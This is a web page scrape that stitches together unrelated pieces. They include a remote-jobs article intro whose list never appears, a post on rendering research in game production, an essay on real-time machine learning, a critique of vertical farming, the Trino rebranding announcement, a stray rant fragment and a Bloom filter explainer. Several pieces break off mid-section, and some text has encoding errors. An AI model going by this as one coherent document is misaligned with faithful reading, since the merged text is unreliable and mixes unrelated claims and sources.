<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><div><div><div><p>Maybe you are looking for a job you can do from home because you are tired of your daily commute or because you want to spend more time with your family. Maybe you want to travel a bit more and that’s why you are looking for a location-independent position. No matter what your reason is, online jobs are more popular than ever before. Check out the best remote job sites to find an online job you can do anywhere and anytime.</p><h2><span id="How_Important_Are_Online_Jobs"></span>How Important Are Online Jobs?<span></span></h2><p>Before we jump right into the list, let’s have a look at some facts and numbers.</p><p>40% of the entire American workforce will be doing <a href="https://www.officevibe.com/blog/11-incredible-coworking-statistics-infographic" target="_blank" rel="noopener noreferrer">freelance work in 2020</a>. There are estimations, that <a href="https://levels.io/future-of-digital-nomads/" target="_blank" rel="noopener noreferrer">by the year 2035 there will be 1 billion digital nomads</a> on this planet. That means that remote jobs will become more and more important. People are realizing, that the location-independent lifestyle has many advantages. The Digital Nomad Survey from 2016 shows, what people like most about this lifestyle:</p><ul><li>It gives them a better work/life balance than office work.</li><li>85% of all digital nomads feel happier with this lifestyle.</li><li>They are less stressed when they do telecommuting work.</li><li>They also enjoy schedule flexibility, the fact that they can work from home and don’t have to commute anymore.</li></ul><p>The industry has taken note of that, too. By the end of 2017, more than <a href="http://www.deskmag.com/en/the-complete-2017-coworking-forecast-more-than-one-million-people-work-from-14000-coworking-spaces-s" target="_blank" rel="noopener noreferrer">14,000 coworking spaces</a> will be in operation around the world, providing location-independent professionals an alternative working environment.</p><p>Moreover, remote job sites are booming and new websites dedicated to online jobs are appearing on a regular basis. These websites show not only open positions for<strong> freelancers</strong>, but also for people who seek to work in a <strong>permanent contract</strong> with a company, but on a remote basis.</p><p>Some of these websites are free to use, but you have to pay a certain fee once you close a deal or a certain percentage of the agreed payment. Other websites charge you to search for jobs, but you don’t have to pay anything once you close a contract. Very few are entirely free to use.</p><p>The following list includes the most popular remote job sites out there.

<h2>Intro</h2>



<p>This post will cover challenges and aspects of production to consider when creating new rendering / graphics techniques and algorithms – especially in the context of <strong>applied research for real time rendering</strong>. I will base this on my personal experiences, working on <strong>Witcher 2, Assassin’s Creed 4: Black Flag, Far Cry 4, and God of War</strong>.</p>



<p>Many of those challenges are easily ignored – they are <strong>real problems in production</strong>, but not necessarily there only if you only read about those techniques, or if you work on pure research, writing papers, or create tech demos.</p>



<p>I have seen statements like “why is this brilliant research technique X not used in production?” both from gamers, but also from my colleagues with academic background. And there are always some good reasons!</p>



<p>The post is also inspired by <a href="https://twitter.com/bartwronsk/status/1327509557015310336">my joke tweet</a> from a while ago about appearing smart and mature as a graphics programmer by “dismissing” most of the rendering techniques – that they are not going to work on foliage. 🙂&nbsp;And yes, I will come back to vegetation rendering a few times in this post.</p>



<p>I tend to think of this topic as well when I hear discussions about how “photogrammetry, raytracing, neural rendering, [insert any other new how topic] will be a universal answer to rendering and replace everything!”. Spoiler alert: not gonna happen (soon).</p>



<h2>Target audience</h2>



<p>Target audience of my post are:</p>



<ul><li>Students in computer graphics and applied researchers,</li><li>Rendering engineers, especially ones earlier in their career – who haven’t built their intuition yet,</li><li>Tech artists and art leads / producers,</li><li>Technical directors and decision makers without background in graphics,</li><li>Hardware engineers and architects working on anything GPU or graphics related (and curious what makes it complicated to use new HW features),</li><li>People who are excited and care about game graphics (or real time graphics in general) and would like to understand a bit “how sausages are made”. Some concepts might be too technical and too much jargon, but then feel free to skip those.</li></ul>



<p>Note that I didn’t place “pure” academic researchers in the above list – as I don’t think that pure research should be considering too many obstacles. Role of the fundamental research is inspiration and creating theory that can be later productionized by people who are experts in productionization.</p>



<p>But if you are a pure researcher and somehow got here, I’ll be happy if you’re interested in what kinds of problems might be on the long way from idea or paper to a product (and <strong>why most new genuinely good research will never find its place in products</strong>).</p>



<h2>How to interpret the guide</h2>



<p>Very important note – <strong>none </strong>of the “obstacles” I am going to describe <strong>are deal breakers</strong>.</p>



<p>Far from it – most successful tech that became state of the art violates many of those constraints! It simply means that those are challenges that will need to be overcome in some way – manual workarounds, feature exclusivity, ignoring the problems, or applying them only in specific cases.</p>



<p>I am going to describe first the <strong>use-cases</strong> – potential uses of the technology and how those impact potential requirements and constraints.</p>



<h2>Use case</h2>



<p>The categories of “use cases” deserve some explanation and description of “severity” of their constraints.</p>



<h3>Tech demo&nbsp;</h3>



<p>Tech demo is the easiest category. If your whole product is a <strong>demonstration of a given technique </strong>(whether for benchmarking, showing off some new research, artistic demoscene), most of the considerations go away.</p>



<p>You can actually retrofit everything: from the demo concept, art itself, camera trajectory to show off the technology the best and avoid any problems.</p>



<p>The main considerations will be around performance (a choppy tech demo can be seen as a tech failure) and working very closely with artists able to show it off.</p>



<p>The rest? Hack away, write one-off code – just don’t have expectations that turning a tech demo into a production ready feature is simple or easy (it’s more like the 99% of work remaining).</p>



<h3>Special level / one-off</h3>



<p>The next level “up” in the difficulty is creating some <strong>special features that are one-off</strong>. It can be some visual special effect happening in a single scene, game intro, or a single level that is different from the other ones. In this case, a feature doesn’t need to be very “robust”, and often replaces many others.</p>



<p>An example could be lighting in the jungle levels in Assassin’s Creed 4: Black Flag that I worked on.&nbsp;</p>



<div><figure><img src="https://lh3.googleusercontent.com/51bdx_bCzH7HBQ7NjppuafWVspC1jLwJ4OwbTLwYq1DLDnnOlxNGZtXby8mLGdqhnjC00WyxAfq1L3d8EIOatPflkT4phHF4Xq2WxOeUSlRCymYNEPQW3WiOeywiz8edAD592PNh" alt="" width="458" height="610"><figcaption>Source: Assassin’s Creed 4: Black Flag promo art. Notice the caustics-like lightshafts that were key rendering feature in jungle levels – and allowed us to save a lot on the shadows rendering!</figcaption></figure></div>



<p>Jungles were “cut off” from the rest of the open world by special streaming corridors and we completely replaced the whole lighting in them! Instead of relying on tree shadow maps and global lighting, we created <strong>fake “caustics”</strong> that looked much softer and played very nicely with our volumetric lighting / atmospherics system. They not only looked better, but also were much faster – obviously worked only because of those special conditions.</p>



<h3>Cinematics</h3>



<p>A slightly more demanding type of feature is cinematic-only one. Cinematics are a bit different as they can be very strictly controlled by cinematic artists and <strong>most of their aspects like lighting, character placement, or animations are faked</strong> – just like in regular cinema! Cinematics often feature fast camera cuts (useful to hide any transitions/popping) and have more computational budget due to more predictable nature (and even in 60fps console games rendered in 30fps).</p>



<div><figure><img src="https://lh3.googleusercontent.com/g3SLk16AtqBNz6TfdSXtNhMDqo6sPXIrwQUQWEjGas1fZ3vYUVLWf_vC5or3-Gen-0Z1WRlt9M46eDiBv5b1tSmU_A0aqKPbq2zR-iJ5IerV42EpuGfrgdTtJVygjhpuQ7R1_-0C" alt=""><figcaption>Witcher 2 cinematic featuring higher character LODs, nice realistic large radius bokeh and custom lighting – but notice how few objects to render are there!</figcaption></figure></div>



<h3>Regular rendering feature</h3>



<p>“Regular” features – lighting, particles, geometry rendering – are the <strong>hardest category</strong>. They need to be either very easy to implement (most of the obstacles / problems solved easily), provide huge benefits surpassing state of the art by far to facilitate the adoption pain, or have some very excited team pushing for it (never underestimate the drive of engineers or artists that really want to see something happen!).</p>



<p>Most of my post will focus on those.&nbsp;</p>



<h3>Key / differentiating feature</h3>



<p>Paradoxically, if something is a key or differentiating feature, this can alleviate many of the difficulties. Let’s take VR – there stereo, performance (low latency), and perfect AA with no smudging (so rather forget about TAA), are <strong>THE features and absolutely core to the experience</strong>. This means that you can completely ignore for example rendering foliage or some animations that would look uncannily – as being immersed and the VR experience of being there are much more important!</p>



<h2>Feature compatibility</h2>



<p>Let’s have a look at compatibility of a newly developed feature with some other common “features” (the distinction between “features”, and the next large section “pipeline” is fuzzy).</p>



<p>Features are not the most important of challenges – arguably the category I’m going to cover at the end (the “process”) is. But those are fun and easy to look at!&nbsp;</p>



<h3>Dense geometry</h3>



<p>Dense geometry like <strong>foliage </strong>– a “feature” that inspired this post – is an enemy of most rendering algorithms.</p>



<p>The main problem is that with very dense geometry (lots of overlapping and small triangles), many “optimizations” and assumptions become impossible.</p>



<p>Early Z and occlusion culling? Very hard.&nbsp;</p>



<p>Decoupling surfaces from volumes? Very hard.</p>



<p>Storing information per unique surface parametrization? Close to impossible.</p>



<p>Amount of vertices to animate and pixels to shade? Huge, shaders need simplification!</p>



<div><figure><img src="https://lh4.googleusercontent.com/P3m7eTgVGodadf6TSd7Ca4Th8wedlR3AEr0wghmVTz0klnfU2hUTq4K1jRdhLljGMRQKgiG-pq02Ayc5Dtllma_jLOF60rtSCx0jID78CYen8cyAW3z2N_bCPYh7KvemZ2k8bWIX" alt=""><figcaption>Witcher 2 foliage – that density! Still IMO one of the best forests in any game.</figcaption></figure></div>



<p>Dense geometry through which you can see (like grass blades) is incompatible with many techniques, for example lightmapping (storing a precomputed lighting per every grass blade texel would be very costly).</p>



<p>If a game has a tree here and there or is placed in a city, this might not be a problem. But for any “natural” environment, a big chunk of the productionization of any feature is going to be combining it to coexist well with foliage.</p>



<h3>Alpha testing</h3>



<p>Alpha testing is an extension of the above, as it disables even more hardware features / optimizations.</p>



<p>Alpha testing is a technique, when a pixel evaluates “alpha” value from a texture or pixel shader computations, and <strong>based on some fixed threshold, doesn’t render/write it</strong>.</p>



<p>It is much faster than alpha blending, but for example disables early z writes (early z tests are ok), and requires raytracing hit shaders and reading a texture to decide if a texel was opaque or not.</p>



<p>It also makes antialiasing very challenging (forget about regular MSAA, you have to emulate alpha to coverage…).</p>



<p>For a description and great visual explanation of some problems, see this blog post of <a href="https://bgolus.medium.com/anti-aliased-alpha-test-the-esoteric-alpha-to-coverage-8b177335ae4f">Ben Golus</a>.</p>



<h3>Animation – skeletal</h3>



<p>Most animators work with “skeletal animations”. <strong>Creating rigs, skinning meshes, animating skeletons</strong>. When you create a new technique for rendering meshes that relies on some heavy precomputations, would animators be able to “deform” it? Would they be able to plug it into a complicated animation blending system? How does it fit in their workflow?</p>



<p>Note that it can also mean rigid deformations, like a rotating wheel – it’s much cheaper to render complicated objects as a skinned whole, than splitting them.</p>



<p>And animation is a must, cannot be an afterthought in any commercial project.</p>



<figure><img src="https://lh5.googleusercontent.com/WBPNVuhqPnwXvUjbrp1UpzraK24bQT3VrXJgslGPgwWqC2M__So3SISqaiBrNytVVvy7HqVV6V64o1VFsAM5NxbzOEn5lwll6ayTOd49M5oC2rF9AAHk5ryI--vv8lqe2rCPWBoU" alt=""><figcaption>Witcher 2 trebuchets were not people, but also had “skeletons” and “bones” and were using skeletal animations!</figcaption></figure>



<h3>Animation – procedural and non-rigid</h3>



<p>The next category of animations are “procedural” and non-rigid. Procedural animations are useful for any animation that is “endless”, relatively simple, and shouldn’t loop too visibly. The most common example is <strong>leaf shimmer and branch movement</strong>.</p>

    <p>After talking to machine learning and infrastructure engineers at major Internet companies across the US, Europe, and China, I noticed two groups of companies. One group has made significant investments (hundreds of millions of dollars) into infrastructure to allow real-time machine learning and has already seen returns on their investments. Another group still wonders if there’s value in real-time ML.</p>

<p>There seems to be little consensus on what real-time ML means, and there hasn’t been a lot of in-depth discussion on how it’s done in the industry. In this post, I want to share what I’ve learned after talking to about a dozen companies that are doing it.</p>

<p>There are two levels of real-time machine learning that I’ll go over in this post.</p>
<ul>
  <li>Level 1: Your ML system makes predictions in real-time (online predictions).</li>
  <li>Level 2: Your system can incorporate new data and update your model in real-time (online learning).</li>
</ul>

<p>I use “model” to refer to the machine learning model and “system” to refer to the infrastructure around it, including data pipeline and monitoring systems.</p>

<h2 id="online_predictions">Level 1: Online predictions - your system can make predictions in real-time</h2>
<p><em><b>Real-time</b> here is defined to be in the order of milliseconds to seconds.</em></p>

<h3 id="online_predictions_use_cases">Use cases</h3>
<p>Latency matters, especially for user-facing applications. In 2009, Google’s experiments demonstrated that <a href="https://services.google.com/fh/files/blogs/google_delayexp.pdf">increasing web search latency 100 to 400 ms reduces the daily number of searches per user by 0.2% to 0.6%</a>. In 2019, <a href="https://blog.acolyer.org/2019/10/07/150-successful-machine-learning-models/">Booking.com found that an increase of 30% in latency cost about 0.5% in conversion rates — “a relevant cost for our business.”</a></p>

<p>No matter how great your ML models are, if they take just milliseconds too long to make predictions, users are going to click on something else.</p>

<h4 id="problems_batch_predictions">Problems with batch predictions</h4>
<p>One non-solution is to avoid making predictions online. You can generate predictions in batch offline, store them (e.g. in SQL tables), and pull out pre-computed predictions when needed.</p>

<p>This can work when the input space is finite – you know exactly how many possible inputs to make predictions for. One example is when you need to generate movie recommendations for your users – you know exactly how many users there are. So you predict a set of recommendations for each user periodically, such as every few hours.</p>

<p>To make their user input space finite, many apps make their users choose from categories instead of entering wild queries. For example, if you go to TripAdvisor, you first have to pick a predefined metropolis area instead of being able to enter just any location.</p>

<p>This approach has many limitations. TripAdvisor results are okay within their predefined categories, such as <b>“Restaurants”</b> in <b>“San Francisco”</b>, but are pretty bad when you try to enter wild queries like <b>“high rating Thai restaurants in Hayes Valley”</b>.</p>

<img alt="MLOps over time" src="https://huyenchip.com/assets/pics/real-time-ml/1_tripadvisor.png">
</figure>
</center>

<p>Limitations caused by batch predictions exist even in more technologically progressive companies like Netflix. Say, you’ve been watching a lot of horrors lately, so when you first log into Netflix, horror movies dominate recommendations. But you’re feeling bright today so you search “comedy” and start browsing the comedy category. Netflix should learn and show you more comedy in your list of their recommendations, right? But it can’t update the list until the next time batch recommendations are generated.</p>

<p>In the two examples above, batch predictions lead to decreases in user experience (which is tightly coupled with user engagement/retention), not catastrophic failures. Other examples are ad ranking, Twitter’s trending hashtag ranking, Facebook’s newsfeed ranking, estimating time of arrival, etc.</p>

<p>There are also many applications that, without online predictions, would lead to catastrophic failures or just wouldn’t work. Examples include high frequency trading, autonomous vehicles, voice assistants, unlocking your phones using face/fingerprints, fall detection for elderly care, fraud detection, etc. Being able to detect a fraudulent transaction that happened 3 hours ago is still better than not detecting it at all, but being able to detect it in real-time can prevent it from going through.</p>

<p>Switching from batch predictions to real-time predictions allows you to use dynamic features to make more relevant predictions. Static features are information that changes slowly or rarely – age, gender, job, neighborhood, etc. Dynamic features are features based on what’s happening right now – what you’re watching, what you’ve just liked, etc. Knowing a user’s interests right now will allow your systems to make recommendations much more relevant to them.</p>

<h3 id="online_predictions_solutions">Solutions</h3>
<p>For your system to be able to make online predictions, it has to have two components:</p>

<ol>
  <li>Fast inference: model that can make predictions in the order of milliseconds</li>
  <li>Real-time pipeline: a pipeline that can process data, input it into model, and return a prediction in real-time</li>
</ol>

<h4 id="fast_inference">Fast inference</h4>
<p>When a model is too big and taking too long to make predictions, there are three approaches:</p>

<p><b>1. Make models faster (inference optimization)</b></p>

<p>E.g. fusing operations, distributing computations, memory footprint optimization, writing high performance kernels targeting specific hardwares, etc.</p>

<p><b>2. Make models smaller (model compression)</b></p>

<p>Originally, this family of technique is to make models smaller to make them fit on edge devices. Making models smaller often makes them run faster. The most common, general technique for model compression is quantization, e.g. using 16-bit floats (half precision) or 8-bit integers (fixed-point) instead of 32-bit floats (full precision) to represent your model weights. In the extreme case, some have attempted 1-bit representation (binary weight neural networks), e.g. <a href="https://arxiv.org/abs/1511.00363">BinaryConnect</a> and <a href="https://arxiv.org/abs/1603.05279">Xnor-Net</a>. The authors of Xnor-Net spun off Xnor.ai, a startup focused on model compression which was <a href="https://www.geekwire.com/2020/exclusive-apple-acquires-xnor-ai-edge-ai-spin-paul-allens-ai2-price-200m-range/">acquired by Apple for a reported $200M</a>.</p>

<p>Another popular technique is <a href="https://arxiv.org/abs/1503.02531">knowledge distillation</a> – a small model (student) is trained to mimic a larger model or an ensemble of models (teacher). Even though the student is often trained with a pre-trained teacher, both may also be trained at the same time. One example of a distilled network used in production is <a href="https://arxiv.org/abs/1910.01108"><strong>DistilBERT</strong></a>, which reduces the size of a BERT model by 40%, while retaining 97% of its language understanding capabilities and being 60% faster.</p>

<p>Other techniques include pruning (finding parameters least useful to predictions and setting them to 0) and low-rank factorization (replacing the over-parametric convolution filters with compact blocks to both reduce the number of parameters and increase speed). See <strong><a href="https://arxiv.org/abs/1710.09282">A Survey of Model Compression and Acceleration for Deep Neural Networks</a></strong> (Cheng et al.. 2017) for a detailed analysis.</p>

<p>The number of research papers on model compression is growing. Off-the-shelf utilities are proliferating. Awesome Open Source has a list of <a href="https://awesomeopensource.com/projects/model-compression"><strong>The Top 40 Model Compression Open Source Projects</strong></a>.</p>

<p><b>3. Make hardware faster</b></p>

<p>This is another research area that is booming. Big companies and startups alike are in a race to develop hardware that allows large ML models to do inference, even training, faster both on the cloud and especially on devices. IDC forecasts that by 2020, the combination of edge and mobile devices doing inferencing will <a href="https://www.arm.com/-/media/global/solutions/artificial-intelligence/ai-ml-on-cpu-whitepaper.pdf?revision=17a2b30b-0f5a-4a42-8681-3d9f3f94e513">total 3.7 billion units, with a further 116 million units doing training</a>.</p>

<h4 id="stream_pipeline">Real-time pipeline</h4>
<p>Suppose you have a ride sharing app and want to detect fraudulent transactions e.g. payments using stolen credit cards. When the true credit owner discovers unauthorized payments, they’ll dispute with their bank and you’ll have to refund the charges. To maximize profits, fraudsters might call multiple rides either in succession or from multiple accounts. In 2019, merchants estimate fraudulent transactions account for an average of <a href="https://network.americanexpress.com/globalnetwork/dam/jcr:09c34553-b4a2-43ca-bf3e-47cbc911ea51/American%20Express%202019%20Digital%20Payments%20Survey_Insights%20Paper.pdf">27% of their annual online sales</a>. The longer it takes for you to detect the stolen credit card, the more money you’ll lose.</p>

<p>To detect whether a transaction is fraudulent, looking at that transaction alone isn’t enough. You need to at least look into the recent history of the user involved in that transaction, their recent trips and activities in-app, the credit card’s recent transactions, and other transactions happening around the same time.</p>

<p>To quickly access these types of information, you want to keep as much of them in-memory as possible. Every time an event you care about happens – a user choosing a location, booking a trip, contacting a driver, canceling a trip, adding a credit card, removing a credit card, etc. – information about that event goes into your in-memory storage. It stays there for as long as they are useful (usually in order of days) then either goes into permanent storage (e.g. S3) or is discarded. The most common tool for this is <a href="https://github.com/apache/kafka">Apache Kafka</a>, with alternatives such as Amazon Kinesis. Kafka is a stream storage: it stores data as it streams.</p>

<p>Streaming data is different from static data – data that already exists somewhere in its entirety, such as CSV files. When reading from CSV files, you know when the job is finished. Streams of data never finish.</p>

<p>Once you’ve had a way to manage streaming data, you want to extract features to input into your ML models. On top of features from streaming data, you might also need features from static data (when was this account created, what’s the user’s rating, etc.). You need a tool that allows you to process streaming data as well as static data and join …</p></div></div>

These systems glow with a fantastic magenta light — from LEDs that are specially tuned to provide optimal light for photosynthesis — often with stacked trays of plants, one on top of the other. Some of this technology is new, especially the LEDs, although pot growers have used tools like this for years.</p><p id="db29">Some of the more notable efforts to build indoor “farms” include <a href="http://www.freightfarms.com/" rel="noopener">Freight Farms</a> in Boston. And there is a group at MIT that is trying to create new high-tech platforms for growing food inside, including “<a href="http://openag.media.mit.edu/hardware/" rel="noopener">food computers</a>”. These folks are very smart, and have done a lot to perfect the technology.</p><p id="47bb">At first blush, these “farms” sound great. Why not <em>completely</em> eliminate food miles, and grow food right next to restaurants, cafeterias, or supermarkets? And why not grow crops inside closed systems, where water can be recycled, and pests can (in theory) be managed without chemicals.</p><p id="d5c4">It sounds great, doesn’t it? But there are many challenges.</p></div></div></section><section><div><div><p id="6ba8"><span>F</span><strong>irst, Vertical Farms Cost a Fortune</strong></p><p id="5f2b">But there are costs to these farms. <em>Huge</em> costs.</p><p id="f0bc">First, these systems are <em>really</em> expensive to build. The shipping container systems developed by <a href="http://www.freightfarms.com/faq/" rel="noopener">Freight Farms</a>, for example, cost between $82,000 and $85,000 <em>per container</em> — an astonishing sum for a box that just grows greens and herbs. Just one container costs as much as 10 entire acres of prime American farmland — which is a far better investment, both in terms of food production and future economic value. Just remember: farmland has the benefit of generally <em>appreciating</em> in <a href="http://www.forbes.com/sites/joshuarogers/2014/09/23/dirt-cheap-investors-are-plowing-into-farmland-heres-why" rel="noopener">value over time</a>, whereas a big metal box is likely to only decrease in value.</p><p id="24cf">Second, food produced this way is <em>very</em> expensive. For example, the Wall Street Journal <a href="http://www.wsj.com/articles/are-shipping-containers-the-future-of-farming-1465393797" rel="noopener">reports</a> that mini-lettuces grown by Green Line Growers costs more than <em>twice</em> as much as organic lettuce available in most stores. And this is typical for other indoor growers around the country: it’s very, very expensive, even compared to organic food. Instead of making food <em>more</em>available, especially to poorer families on limited budgets, these indoor crops are only available to the affluent. It might be fine for gourmet lettuce, or fancy greens for expensive restaurants, but regular folks may find it out of reach.</p><p id="e121">Finally, indoor farms use <em>a lot</em> of energy and materials to operate. The container farms from Freight Farms, for example, use about <a href="http://www.freightfarms.com/faq/" rel="noopener">80 kilowatt-hours of electricity a day</a> to power the lights and pumps. That’s nearly 2–3 times as much electricity as a typical (and still very inefficient) American home, or about 8 times the electricity used by an average San Francisco apartment. And on the average American electrical grid, this translates to emitting <em>44,000 pounds of CO2 per container per year</em>, from electricity alone, not counting any additional heating costs. This is <em>vastly</em> more than the emissions it would take to ship the food from someplace else.</p><p id="0e49">And none of it is necessary.</p></div></div></section><section><div><div><p id="1017"><span>B</span><strong>ut, Wait, Can’t Indoor Farms Use Renewable Energy?</strong></p><p id="5bbd">Proponents of indoor techno-farms often say that they can offset the enormous sums of electricity they use, by powering them with renewable energy — especially solar panels — to make the whole thing carbon neutral.</p><p id="5b5d">But just stop and think about this for a second.</p><p id="5f6a">These indoor “farms” would use solar panels to harvest naturally occurring sunlight, and convert it into electricity, so that they can power…<em>artificial sunlight</em>? In other words<em>, </em>they’re<em> trying to use the sun to replace the sun.</em></p><p id="0a0f">But we don’t need to replace the sun. Of all of the things we should worry about in agriculture, the availability of free sunlight is not one of them. Any system that seeks to replace the sun to grow food is probably a bad idea.</p></div></div></section><section><div><div><p id="e3d3"><span>B</span><strong>esides, “Food Miles” Aren’t a Big Climate Problem</strong></p><p id="29a5">Sometimes we hear that vertical farms help the environment by reducing “food miles” — the distance food items travel from farm to table — and thereby reduce fuel consumption and greenhouse gas emissions.</p><p id="0f7a">This sounds logical, but it turns out to be a red herring.</p><p id="c2ec">Strange as it might seem, local food typically uses about the same amount of energy — per pound — to transport as food grown far away. Why? Short answer: volume and method of transport. A larger food operator can ship food more efficiently — even if it travels longer distances — because of the gigantic volumes they work in. Plus, ships, trains, and even large trucks driving on Interstate highways use less fuel, per pound per mile, than small trucks driving around town.</p><p id="a654">Plus it turns out that “food miles” aren’t a very big source of CO2 emissions anyway, whether they’re local or not. In fact, they pale in comparison to emissions from deforestation, methane from cattle and rice fields, and nitrous oxide from over-fertilized fields. And local food systems — especially organic farms that use fewer fertilizers, and grass fed beef that sequesters carbon in the soil — can reduce these more critical emissions. At the end of the day, local food systems are generally better for the environment, including greenhouse gas emissions. Just don’t worry about emissions from food miles too much.</p></div></div></section><section><div><div><p id="6153"><span>A</span><strong>nd These Vertical “Farms” Can’t Grow Much</strong></p><p id="1ac1">A further problem with indoor farms is that a lot of crops could never develop properly in these artificial conditions. While LED lights provide the light needed for <em>photosynthesis</em> to occur, they don’t provide the proper mix of light and heat to trigger plant development stages — like those that tell plants when to put on fruit or seed. Moreover, a lot of crops need a bit of wind to develop tall, strong stalks, needed later when they are carrying heavy loads before harvest. As a result, indoor farms are severely limited, and have a hard time growing things besides simple greens.</p><p id="71b1">Indoor farms might be able to provide some <em>garnish</em> and <em>salads</em> to the world, but forget about them as a means of growing much other <em>food</em>.</p></div></div></section><section><div><div><p id="003c"><strong>A Better Way?</strong></p><p id="bf8f">I’m not the only critic of indoor, high-tech, energy-intensive agriculture. Other authors are starting to point out the problems with these systems too (read very good critiques <a href="http://www.salon.com/2016/02/17/enough_with_the_vertical_farming_partner/" rel="noopener">here</a>, <a href="http://www.counterpunch.org/2012/12/11/the-vertical-farming-scam/" rel="noopener">here</a>, <a href="https://www.theguardian.com/sustainable-business/2015/apr/10/indoor-farming-makes-no-economic-environmental-sense" rel="noopener">here</a>, and <a href="http://news.cornell.edu/stories/2014/02/indoor-urban-farms-called-wasteful-pie-sky" rel="noopener">here</a>).</p><p id="02f4">While I appreciate the enthusiasm and innovation put into developing indoor farms, I think these efforts are, at the end of the day, counterproductive.</p><p id="8dea">Instead, I think we should use the same investment of dollars, incredible technology, and amazing brains to solve other agricultural problems — like developing new methods for drip irrigation, better grazing systems that lock up soil carbon, and ways of recycling on-farm nutrients. Organic farming and high-precision agriculture are doing promising things, and need more help. We also need innovation and capital to help other parts of the food system, especially in tackling food waste, and getting people to shift their diets towards more sustainable directions.</p><p id="9534">An interconnected network of good farms —real farms that provide nutritious food, with social and environmental benefits to their communities — is the kind of innovation we really need.</p></div></div></section><section><div><p id="b135">NOTE: parts of this piece were adapted from an earlier blog article of mine called <em>“Local Food is Great, But Can It Go Too Far?”</em></p></div></section><section><div><div><p id="68aa"><em>Dr. </em><a href="http://globalecoguy.org/" rel="noopener"><em>Jonathan Foley</em></a><em> (@</em><a href="http://twitter.com/@globalecoguy" rel="noopener"><em>GlobalEcoGuy</em></a><em>) is a climate &amp; environmental scientist, writer, and speaker.

    <p>We’re rebranding PrestoSQL as Trino. The software and the community you have come to love and depend on aren’t 
going anywhere, we are simply renaming. <strong>Trino is the new name for PrestoSQL</strong>, the project supported by the founders 
and creators of Presto® along with the major contributors – just under a shiny new name. And now you can find us here:</p>

<ul>
  <li>GitHub: <a href="https://github.com/trinodb/trino">https://github.com/trinodb/trino</a>. Please give it a <a href="https://github.com/trinodb/trino/blob/master/.github/star.png">star</a>!</li>

  <li>Slack: <a href="https://trino.io/slack.html">https://trino.io/slack.html</a></li>
</ul>

<p>If you want to learn why we’re doing this, read on…</p>

<!--more-->

<p>In 2012, Dain, David and Martin joined the Facebook data infrastructure team. Together with Eric Hwang, we created 
Presto® to address the problems of low latency interactive analytics over Facebook’s massive Hadoop data warehouse. 
One of our non-negotiable conditions was for Presto® to be an open source project. Open source is in our DNA - we had 
all used and participated in open source projects to various degrees in the past, and we recognized the power of open 
communities and developers coming together to build successful software that can stand the test of time.</p>

<p><img src="https://trino.io/assets/blog/trino-announcement/team.jpg" alt=""></p>

<p>Over the next six years, we worked hard to build a healthy open source community and ecosystem around the project. We 
worked with developers and users all over the world and welcomed them into the Presto® community. Presto® was on a path 
of increasing growth and success, in large part because of the contributions from developers across many fields and all 
over the world.</p>

<p>Unfortunately in 2018, it became clear that Facebook management wanted to have tighter control over the project and its 
future. This culminated with their decision to grant Facebook developers commit rights on the project without any prior 
experience in Presto®. We strongly believe that this kind of decision is not compatible with having a healthy, open 
community. Moreover, they made this decision by fiat without engaging the Presto® community. As a matter of principle, 
we had no choice but to leave Facebook in order to focus on making sure Presto® continued to be a successful project 
with an open, collaborative and independent community. In reality, the choice was easy.</p>

<p>We started the Presto Software Foundation in January 2019 as an independent entity to oversee the development of the 
software and community, continuing the meritocratic system that had been in place over the previous 6 years. The community 
quickly consolidated under this new home. We intentionally stayed unemployed over the next 10 months to focus on expanding 
and strengthening the community by working directly with major users and contributors, as well as reaching out to a wider 
group of users and developers across the globe. This resulted in new use cases and an injection of energy, making the 
project more vibrant than ever before as even more new users and developers became engaged. But, don’t take our word for 
it, let the data speak for itself:</p>

<p><img src="https://trino.io/assets/blog/trino-announcement/commits.png" alt=""></p>

<p>Months after this consolidation, Facebook decided to create a competing community using The Linux Foundation®. As a first 
action, Facebook applied for a trademark on Presto®. This was a surprising, norm-breaking move because up until that point, 
the Presto® name had been used without constraints by commercial and non-commercial products for over 6 years. In September 
of 2019, Facebook established the Presto Foundation at The Linux Foundation®, and immediately began working to enforce this 
new trademark. We spent the better part of the last year trying to agree to terms with Facebook and The Linux Foundation 
that would not negatively impact the community, but unfortunately we were unable to do so. The end result is that we must 
now change the name in a short period of time, with little ability to minimize user disruption.</p>

<p>On a personal note, and as the founders who named the project Presto® in the first place, this is an incredibly sad and 
disappointing turn of events. And while we will always have fondness for the name Presto®, we have come to accept that a 
name is just a name. To be frank, we’re tired of this endless distraction, and we intend to focus on what matters most 
and what we are best at doing – building high quality software everyone can rely on and fostering a healthy community 
of users and developers that build it and support it. We’re not going anywhere – we’re the same people, the same amazing 
software, under a new name: Trino.</p>

<p><strong>If you love this project, you already love Trino. ❤️</strong></p>

<p>They stole our future. Let's take it back.</p>

<p>Here at the end of the world, it's time to take stock. Is technology a force for good? Can it be? Was it ever? How did we end up with a world made up of "five websites, each filled with screenshots of text from the other four" (h/t Tom Eastman)? Should we worry that machine learning will take away our free will through A/B splitting and Big Five Personality Types? Where the fuck did all these Nazis come from? </p>

    <p>Bloom filters are a data structure which allows you to test whether an element exists in a set, with lower memory usage and better access times than other hash table implementations. It is probabilistic, and while it can guarantee negative matches, there is a slight chance it returns a false positive match. Through clever mathematical assumptions, we can produce constraints to minimise the chance of a false positive.</p>

<h2 id="description">Description</h2>

<p>Let there be a set of elements $N$, and we wish to store each element $e \in N$ in the set $F$. To do this, we introduce the set $K$ which has $k$ number of hash functions which hash the same element to <em>different</em> values.</p>

<p>In the following example, elements $x$ and $y$ are hashed by $k = 3$ hash functions.</p>

<p><img src="http://andybui01.github.io/images/bloom-filter/figure1.png" width="200"></p>

<p>Next, we introduce the bit array $M$ which has $m$ bits. This bit array is the underlying data structure that represents $F$, and we say an element $e$ is in $F$ if all of its corresponding bits (after hashing) in the bit array are set.</p>

<p>In the following image, $x$ is in $F$ hence all of its hashed bits within $M$ are set. Only one of $y$â€™s hashed bits are set so it is not in $F$. $x$ and $y$ are also sharing a bit at $M[4]$.</p>

<p><img src="http://andybui01.github.io/images/bloom-filter/figure2.png" width="400"></p>

<p>As we hash more elements from $N$, more bits are set to 1 in $M$ and eventually we get a <em>false positive</em> when testing set membership. This occurs when all of an elementâ€™s bits are set, although it was never inserted.</p>

<p>Consider the following scenario: $x$ and $y$ are in $F$, $z$ is not. However, $z$â€™s hashed bits are all set, giving the (false) impression that $z$ is in $F$.</p>

<p><img src="http://andybui01.github.io/images/bloom-filter/figure3.png" width="500"></p>

